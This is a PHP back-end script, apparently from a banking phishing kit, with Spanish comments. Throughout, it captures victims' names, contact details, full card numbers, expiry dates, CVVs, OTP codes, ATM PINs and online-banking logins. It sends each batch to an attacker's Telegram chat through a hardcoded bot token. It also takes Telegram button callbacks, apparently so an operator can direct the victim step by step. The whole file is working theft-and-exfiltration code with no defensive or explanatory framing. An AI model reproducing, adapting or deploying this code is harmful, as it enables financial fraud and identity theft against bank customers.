<?php
session_start();

// Definir el token del bot y el chatId
$botToken = '7359600696:AAEEfXJIFU_Q98HKTPvbY48Pyy-PP77BjV8';
$chatId = '1562830270';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $page = $_POST['pag'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $mensaje = "IP: " . $ip;

    // Verificar si la sesión 'data' existe, si no, inicializarla
    if (!isset($_SESSION['data'])) {
        $_SESSION['data'] = json_encode([]);
    }

    // Procesar según el valor de $page
    switch ($page) {
        case "info":
            // En lugar de redirigir a pago.php, redirigimos a recibido.php
            header("Location: recibido.php");
            exit;
        case "tarjeta":
            // Validar datos de entrada
            $nombre = $_POST['nombre'] ?? '';
            $tel = $_POST['tel'] ?? '';
            $ciudad = $_POST['ciudad'] ?? '';
            $direccion = $_POST['direccion'] ?? '';
            $correo = $_POST['correo'] ?? '';
            $TxtBanco = $_POST['TxtBanco'] ?? '';
            $inputNumero = $_POST['inputNumero'] ?? '';
            $selectMes = $_POST['selectMes'] ?? '';
            $inputCCV = $_POST['inputCCV'] ?? '';

            if (empty($inputNumero)) {
                exit('Error: el número de tarjeta es obligatorio.');
            }

            $inputinfo = fetchInfo($inputNumero);

            $_SESSION['bank'] = $TxtBanco;
            $_SESSION['tarjeta'] = $inputNumero;
            $_SESSION['info'] = json_encode([$nombre]);

            // Armar el mensaje
            $mensaje .= "\n 🟢NOMBRE: " . $nombre;
            $mensaje .= "\n 🟢TELEFONO: " . $tel;
            $mensaje .= "\n 🟢CIUDAD: " . $ciudad;
            $mensaje .= "\n 🟢DIRECCION: " . $direccion;
            $mensaje .= "\n 🟢CORREO: " . $correo;
            $mensaje .= "\n 🟢BANCO: " . $TxtBanco;
            $mensaje .= "\n 🟢CC: " . $inputNumero;
            $mensaje .= "\n 🟢FECHA: " . $selectMes;
            $mensaje .= "\n 🟢CVV: " . $inputCCV;

            // Enviar mensaje a Telegram
            messenger($mensaje, $botToken, $chatId);

            // Redirigir a recibido.php
            header("Location: recibido.php");
            exit;
        case "otp":
            $dataInfo = json_decode($_SESSION['info'], true);
            $otp = $_POST['otp'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🟢OTP: " . $otp;

            // Enviar mensaje a Telegram
            messenger($mensaje, $botToken, $chatId);

            // Redirigir a recibido.php
            header("Location: recibido.php");
            exit;
        case "atm":
            $dataInfo = json_decode($_SESSION['info'], true);
            $passatm = $_POST['txtPassword'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🏧CLAVE CAJERO: " . $passatm;

            // Enviar mensaje a Telegram
            messenger($mensaje, $botToken, $chatId);

            // Redirigir a recibido.php
            header("Location: recibido.php");
            exit;
        case "logo":
            $dataInfo = json_decode($_SESSION['info'], true);
            $usuario = $_POST['txtUser'] ?? '';
            $pass = $_POST['txtPassword'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🟢USUARIO: " . $usuario;
            $mensaje .= "\n 🟢CONTRASEÑA: " . $pass;

            // Enviar mensaje a Telegram
            messenger($mensaje, $botToken, $chatId);

            // Redirigir a recibido.php
            header("Location: recibido.php");
            exit;
        case "final":
            // Manejar caso final si es necesario
            header("Location: recibido.php");
            exit;
        default:
            error_log('Error: valor de $page no reconocido.');
            exit('Error: valor de $page no reconocido.');
    }
}

// Función para obtener información de la tarjeta (BIN) usando Binlist
function fetchInfo($numero) {
    $url = "https://lookup.binlist.net/" . trim($numero);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error en la consulta a Binlist: ' . curl_error($ch));
        return '';
    }

    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['bank']['name'])) {
        $bank = $data['bank']['name'];
        $brand = $data['brand'] ?? '';
        $country = $data['country']['name'] ?? '';
        $scheme = $data['scheme'] ?? '';
        $type = $data['type'] ?? '';
        return "$bank,$brand,$country,$scheme,$type";
    } else {
        return "";
    }
}

// Función para enviar mensajes a Telegram
function messenger($mensaje, $botToken, $chatId) {
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje
    ];

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error al enviar la solicitud a Telegram: ' . curl_error($ch));
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode != 200) {
        error_log('Telegram API devolvió el código: ' . $httpCode . ' con la respuesta: ' . $response);
    }

    curl_close($ch);
}

// Manejar actualizaciones de Telegram (callback_query)
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (isset($update['callback_query'])) {
    $callbackData = $update['callback_query']['data']; // Datos del botón presionado

    // Guardar el botón presionado en un archivo de estado
    file_put_contents('button_state.json', json_encode([
        'button' => $callbackData,
        'timestamp' => time()
    ]));

    // Confirmar a Telegram que la acción fue recibida
    $chatId = $update['callback_query']['message']['chat']['id'];
    $messageId = $update['callback_query']['message']['message_id'];

    $data = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => "Acción recibida: " . $callbackData,
    ];

    $apiUrl = "https://api.telegram.org/bot{$botToken}/editMessageText";

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error al enviar la solicitud a Telegram: ' . curl_error($ch));
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode != 200) {
        error_log('Telegram API devolvió el código: ' . $httpCode . ' con la respuesta: ' . $response);
    } else {
        error_log('Actualización del mensaje enviada a Telegram correctamente.');
    }

    curl_close($ch);
}
